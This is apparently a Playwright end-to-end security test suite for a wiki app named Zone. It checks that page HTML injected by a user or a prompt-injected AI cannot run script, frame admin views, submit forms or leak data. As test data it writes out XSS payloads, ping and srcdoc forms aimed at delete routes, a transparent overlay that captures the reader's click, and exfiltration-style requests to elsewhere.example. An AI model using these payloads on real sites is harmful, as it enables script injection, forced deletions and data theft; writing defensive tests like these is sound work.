"""The Content-Security-Policy in a real browser: a page's raw HTML (which an
AI client may have written after a prompt injection) runs no script, while
Zone's own scripts keep working."""

import re

from playwright.sync_api import expect

from tests.e2e.conftest import wait_until

ATTACKS = (
    "<script>window.pwned = 'script'</script>\n\n"
    "<img id=\"bad-img\" src=\"/nope.png\" onerror=\"window.pwned = 'onerror'\">\n\n"
    "<a id=\"bad-link\" href=\"javascript:window.pwned = 'link'\">click me</a>\n\n"
)


def test_raw_html_in_a_page_runs_no_script(page, wiki):
    wiki.write("evil", "# Evil\n\n" + ATTACKS + "```python\nx = 1\n```\n")
    page.goto("/page/evil")
    # Zone's own scripts still run: the code block is highlighted.
    expect(page.locator("article.page-content pre code.hljs")).to_have_count(1)
    expect(page.locator("#user-content-bad-img")).to_have_count(1)
    page.locator("#user-content-bad-link").click()
    page.wait_for_timeout(300)
    assert page.evaluate("window.pwned") is None
    # The browser blocked them, which the harness would count against Zone.
    assert page.csp_violations
    page.csp_violations.clear()


def test_editor_preview_runs_no_handler(page, wiki):
    # The live preview puts rendered HTML into the page with innerHTML, where
    # an onerror= handler would otherwise run.
    page.goto("/edit/preview-evil")
    page.keyboard.press("Control+End")
    page.keyboard.type('<img id="bad-img" src="/nope.png" onerror="window.pwned = 1">')
    expect(page.locator("#editor-preview #user-content-bad-img")).to_have_count(1)
    page.wait_for_timeout(300)
    assert page.evaluate("window.pwned") is None
    assert page.csp_violations
    page.csp_violations.clear()


def test_uploaded_script_does_not_run(page, wiki):
    # script-src 'self' trusts Zone's origin, so an upload must not be
    # servable as a script: it comes as application/octet-stream with nosniff.
    # A page's raw HTML makes no <script> (it shows as text), so the script
    # element is made here as any other way into the page would.
    (wiki.root / "_assets" / "x.js").write_text("window.pwned = 'upload'\n")
    wiki.write("loader", '# Loader\n\n<script src="/_assets/x.js"></script>\n')
    page.goto("/page/loader")
    expect(page.locator("article.page-content")).to_contain_text('<script src="/_assets/x.js"></script>')
    expect(page.locator("article.page-content script")).to_have_count(0)
    page.evaluate("() => { const s = document.createElement('script'); s.src = '/_assets/x.js'; document.body.append(s); }")
    page.wait_for_timeout(300)
    assert page.evaluate("window.pwned") is None


def test_a_page_cannot_hand_the_task_lists_their_tasks(page, wiki):
    # The task lists start from the tasks the page brings along, whose notes
    # come as HTML the server rendered. A page's raw HTML that gave one of its
    # elements the block's place (an id the lists once looked for, a <script>
    # of JSON before the list) handed them tasks of its own, whose "rendered"
    # notes went into the cards as they were: a live form posting to Zone.
    import datetime
    import json
    today = datetime.date.today().isoformat()
    fake = json.dumps({"tasks": [{"id": "deadbeef01", "title": "Fake task", "description": "see",
                                  "created_at": today + "T09:00:00", "due_date": today}],
                       "notes": ['<form id="evil" method="post" action="/delete/index"><button>x</button></form>'],
                       "comments": []}).replace("<", "\\u003c").replace(">", "\\u003e")
    wiki.write("plans", "# Plans\n\n"
               f'<div id="tasks-initial" class="tasks-initial" hidden>{fake}</div>\n\n'
               f'<script type="application/json" id="tasks-initial" class="tasks-initial">{fake}</script>\n\n'
               "[[tasks: view=open]]\n")
    (wiki.root / "_tasks").mkdir(exist_ok=True)
    (wiki.root / "_tasks" / "tasks.json").write_text(json.dumps([{
        "id": "real-1", "title": "Real task", "created_at": today + "T09:00:00", "due_date": today}]))
    page.goto("/page/plans")
    expect(page.locator(".tasks-app .task-item", has_text="Real task")).to_have_count(1)
    expect(page.locator(".task-item", has_text="Fake task")).to_have_count(0)
    expect(page.locator("#evil")).to_have_count(0)
    expect(page.locator("article.page-content script")).to_have_count(1)   # the page's tasks, the list's own
    expect(page.locator(".tasks-app > script.tasks-initial")).to_have_count(1)


def test_a_page_frames_no_form(page, wiki):
    # An iframe's srcdoc would be a document of Zone's own origin, where a
    # form posts to Zone like one of its own: however the attribute is
    # written, the frame stays empty.
    form = "&lt;form method=post action=/delete/index&gt;&lt;button id=go&gt;Go&lt;/button&gt;&lt;/form&gt;"
    wiki.write("framed", "# Framed\n\n"
               f'<iframe id="f1" srcdoc="{form}"></iframe>\n\n'
               f"<iframe id=\"f2\" a=b' srcdoc=\"{form}\"></iframe>\n\n"
               f'<!-- <a title=" --><iframe id="f3" srcdoc="{form}"></iframe><!-- " -->\n')
    page.goto("/page/framed")
    expect(page.locator("article.page-content iframe")).to_have_count(3)
    for frame in ("f1", "f2", "f3"):
        assert page.locator(f"#user-content-{frame}").get_attribute("srcdoc") is None
        expect(page.frame_locator(f"#user-content-{frame}").locator("form")).to_have_count(0)


def test_a_links_ping_posts_nothing(page, wiki):
    # A link's ping is a POST the browser sends to each URL in it when the
    # link is followed: same-origin, with the session's cookie, to a route
    # that needs no body (a page's delete) it would act as the viewer.
    wiki.write("victim", "# Victim\n\nStill here.\n")
    wiki.write("pinger", "# Pinger\n\n"
               '<a id="go" href="/page/index" ping="/delete/victim">Read on</a>\n\n'
               'Inline <a id="go2" href="/page/index" PING = "/delete/victim">too</a>.\n')
    page.goto("/page/pinger")
    assert page.locator("#user-content-go").get_attribute("ping") is None
    assert page.locator("#user-content-go2").get_attribute("ping") is None
    page.locator("#user-content-go").click()
    expect(page).to_have_url(re.compile(r"/page/index$"))
    page.wait_for_timeout(500)
    assert (wiki.root / "victim.md").exists()


def test_a_page_frames_no_page_of_zones(page, wiki):
    # A page's raw HTML could lay a transparent frame of /admin or /changes
    # (one click there removes a user or undoes a change) over a decoy: no
    # view of Zone's may be framed, by another site or by Zone itself. An
    # upload may: a page shows a PDF or a picture in an iframe.
    (wiki.root / "_assets" / "note.txt").write_text("framed upload\n")
    wiki.write("decoy", "# Decoy\n\n"
               '<iframe id="zone" src="/page/index" style="opacity:0.01"></iframe>\n\n'
               '<iframe id="tasks" src="/tasks"></iframe>\n\n'
               '<iframe id="upload" src="/_assets/note.txt"></iframe>\n')
    page.goto("/page/decoy")
    expect(page.frame_locator("#user-content-upload").locator("body")).to_contain_text("framed upload")
    page.wait_for_timeout(300)
    for frame in ("zone", "tasks"):
        expect(page.frame_locator(f"#user-content-{frame}").locator("article, .tasks-app, nav")).to_have_count(0)
    page.csp_violations.clear()
    page.js_errors.clear()


def test_a_tasks_id_is_text_on_its_card(page, wiki):
    # A tasks file written by hand (or by an older Zone) may hold any id:
    # the card shows the task, and the id makes no element of its own.
    import json
    evil = 'x"></span><form id="evil" method="post" action="/delete/index"><button>ok</button></form><span data-x="'
    (wiki.root / "_tasks").mkdir(exist_ok=True)
    (wiki.root / "_tasks" / "tasks.json").write_text(json.dumps([{
        "id": evil, "title": "Odd id", "created_at": "2026-01-01T10:00:00"}, {
        "id": "done-1", "title": "Odd day", "created_at": "2026-01-01T10:00:00",
        "due_date": "<i id=evil2>", "start_date": "<i id=evil3>"}]))
    page.goto("/tasks?view=open&group=none")
    expect(page.locator(".task-item")).to_have_count(2)
    expect(page.locator("#evil, #evil2, #evil3")).to_have_count(0)
    assert page.locator(".task-item").first.get_attribute("data-id") in (evil, "done-1")


def test_a_page_asks_no_other_host_for_anything(page, wiki):
    # Whatever a page's HTML names elsewhere, the browser asks for none of
    # it (the harness fails a test with a request to another host): each is
    # a way to send text away. A markdown image elsewhere is a link.
    there = "https://elsewhere.example"
    wiki.write("leaky", "# Leaky\n\n"
               f"![a cat]({there}/cat.png?secret)\n\n"
               f'<img id="raw-img" src="{there}/raw.png?secret">\n\n'
               f'<iframe id="raw-frame" src="{there}/frame?secret"></iframe>\n\n'
               f'<video src="{there}/v.mp4?secret"></video> <audio src="{there}/a.mp3?secret"></audio>\n\n'
               f'<style>@import url("{there}/s.css?secret"); #x {{ background: url({there}/bg.png?secret) }}'
               f' @font-face {{ font-family: f; src: url({there}/f.woff2?secret) }} #x {{ font-family: f }}</style>\n\n'
               f'<div id="x" style="background-image: url({there}/inline.png?secret)">styled</div>\n\n'
               f'<link rel="stylesheet" href="{there}/l.css?secret">\n'
               f'<link rel="prefetch" href="{there}/p?secret">\n\n'
               "```python\nx = 1\n```\n\n$e^{i\\pi}$\n")
    page.goto("/page/leaky")
    expect(page.locator("article.page-content pre code.hljs")).to_have_count(1)   # Zone's own still work
    expect(page.locator("article.page-content .katex")).to_have_count(1)
    link = page.locator("article.page-content a.external-image")
    expect(link).to_have_text("a cat")
    expect(link).to_have_attribute("href", f"{there}/cat.png?secret")
    expect(page.locator("article.page-content link")).to_have_count(0)
    page.wait_for_timeout(500)
    assert page.external_requests == []
    assert page.csp_violations   # the raw ones, blocked
    page.csp_violations.clear()
    # The harness's own script, run in the frame's blocked (empty) document.
    assert all("sessionStorage" in e for e in page.js_errors)
    page.js_errors.clear()


def test_a_wiki_without_a_login_asks_for_one_first(page, wiki, monkeypatch):
    # Reached from other devices (as the tests reach it) and no login, not
    # on purpose: the first-run page, whichever page was asked for.
    from tests import settings
    monkeypatch.setattr(settings, "NO_LOGIN", False)
    wiki.write("plans", "# Plans\n\nsecret words\n")
    page.goto("/page/plans")
    expect(page).to_have_url(re.compile(r"/setup$"))
    expect(page.locator("form.login-form h2")).to_have_text("Set a password for Zone")
    expect(page.locator("body")).not_to_contain_text("secret words")
    page.fill("input[name=password]", "correct horse")
    page.fill("input[name=again]", "correct horse")
    page.locator("form.login-form button[type=submit]").click()
    expect(page).to_have_url(re.compile(r"/page/index$"))
    page.goto("/page/plans")
    expect(page.locator("article.page-content")).to_contain_text("secret words")
    expect(page.locator("#logout-form, .logout-btn, form[action='/logout']").first).to_be_attached()


def test_a_login_is_set_from_the_menu_on_localhost(page, wiki, monkeypatch):
    # On localhost alone a wiki needs no login; Set a login in the menu opens
    # the first run's form, and with a name the wiki has its first user.
    from tests import settings
    monkeypatch.setattr(settings, "NO_LOGIN", False)
    monkeypatch.setattr(settings, "ZONE_ALLOW_REMOTE", False)
    wiki.write("plans", "# Plans\n\nsecret words\n")
    page.goto("/page/plans")
    expect(page.locator("article.page-content")).to_contain_text("secret words")   # no login needed
    page.locator(".top-actions .top-menu").click()
    page.locator(".module-menu").get_by_role("menuitem", name="Set a login").click()
    expect(page).to_have_url(re.compile(r"/setup$"))
    expect(page.locator("form.login-form h2")).to_have_text("Set a login for Zone")
    # Not now leads back, and nothing was set.
    page.get_by_role("link", name="Not now").click()
    expect(page).to_have_url(re.compile(r"/page/index$"))
    page.goto("/setup")
    page.fill("input[name=username]", "alice")
    page.fill("input[name=password]", "correct horse")
    page.fill("input[name=again]", "correct horse")
    page.locator("form.login-form button[type=submit]").click()
    expect(page).to_have_url(re.compile(r"/page/index$"))
    # Signed in as the first user: the user button, and her menu.
    btn = page.locator(".top-actions .top-user")
    expect(btn).to_have_attribute("title", "alice")
    btn.click()
    menu = page.locator(".module-menu:not(.groups-menu)")
    expect(menu.locator(".menu-who")).to_have_text("Signed in as alice")
    expect(menu.get_by_role("menuitem", name="Set a login")).to_have_count(0)
    expect(menu.get_by_role("menuitem", name="Admin")).to_be_visible()


def test_a_pages_ids_stand_in_for_none_of_zones(page, wiki):
    # Zone's scripts find their elements by id, the browser globals by name:
    # a page's <data id="task-edit-id" value=…> came first and would aim the
    # task dialog's save at another task, an <a name="katex"> was
    # window.katex. A page's ids and names have "user-content-" in front, and
    # a #link to one still goes there.
    wiki.write("ids", "# Ids\n\n"
               '<data id="task-edit-id" value="other-task">x</data> <a name="katex"></a>\n\n'
               "[to the note](#note)\n\n" + "Filler.\n\n" * 80 +
               '<a name="note"></a>The note.\n\n[[tasks:]]\n')
    page.goto("/page/ids")
    assert page.evaluate("document.getElementById('task-edit-id').tagName") == "INPUT"
    assert page.evaluate("typeof window.katex") == "undefined"
    expect(page.locator("data#user-content-task-edit-id")).to_have_count(1)
    def in_view():
        return page.evaluate("document.getElementsByName('user-content-note')[0].getBoundingClientRect().top"
                             " < innerHeight")
    assert not in_view()
    page.locator("a[href='#note']").click()
    wait_until(page, in_view)
    page.goto("/page/index")
    page.goto("/page/ids#note")
    wait_until(page, in_view)


def test_a_click_submits_only_a_form_zone_put_there(page, wiki):
    # A page's own <style> could show the page's closed Delete dialog and lay
    # its button over the whole page, transparent: the reader's next click
    # anywhere deleted the page. A submit from a dialog that isn't open is
    # cancelled (CSS can't open one), and so is one from a form in what Zone
    # renders from text, however it got there; Zone's own forms work.
    wiki.write("plans", "# Plans\n\nRead me.\n\n"
               "<style>#page-delete-dialog { display: block !important; position: fixed !important;"
               " inset: 0 !important; opacity: 0 !important; z-index: 2147483647 !important;"
               " margin: 0 !important; max-width: none !important; max-height: none !important;"
               " width: 100vw !important; height: 100vh !important }"
               " #page-delete-dialog .btn-danger { position: fixed !important; inset: 0 !important;"
               " width: 100vw !important; height: 100vh !important }</style>\n\n"
               "[[tasks: list=shopping]]\n")
    page.goto("/page/plans")
    posts = []
    page.on("request", lambda r: posts.append(r.url) if r.method == "POST" else None)
    page.mouse.click(400, 500)
    page.wait_for_timeout(500)
    assert (wiki.root / "plans.md").exists() and posts == []
    page.evaluate("() => document.querySelector('article.page-content style').remove()")
    # A form that got into the article some other way.
    page.evaluate("""() => {
      const f = document.createElement('form');
      f.method = 'post'; f.action = '/delete/plans';
      f.innerHTML = '<button id="sneaky">Go</button>';
      document.querySelector('article.page-content p').append(f);
    }""")
    page.locator("#sneaky").click()
    page.wait_for_timeout(500)
    assert (wiki.root / "plans.md").exists() and posts == []
    expect(page).to_have_url(re.compile(r"/page/plans$"))
    # Zone's own: the embed's "Create the list", and the page's Delete opened
    # from its menu.
    page.locator("#tasks-no-list button[type=submit]").click()
    expect(page).to_have_url(re.compile(r"/tasks\?list=shopping"))
    page.goto("/page/plans")
    page.evaluate("() => document.querySelector('article.page-content style').remove()")
    page.locator(".page-menu-btn").first.click()
    page.locator("#page-menu [data-action=delete]").click()
    page.locator("#page-delete-dialog .btn-danger").click()
    expect(page).to_have_url(re.compile(r"/page/index$"))
    assert not (wiki.root / "plans.md").exists()
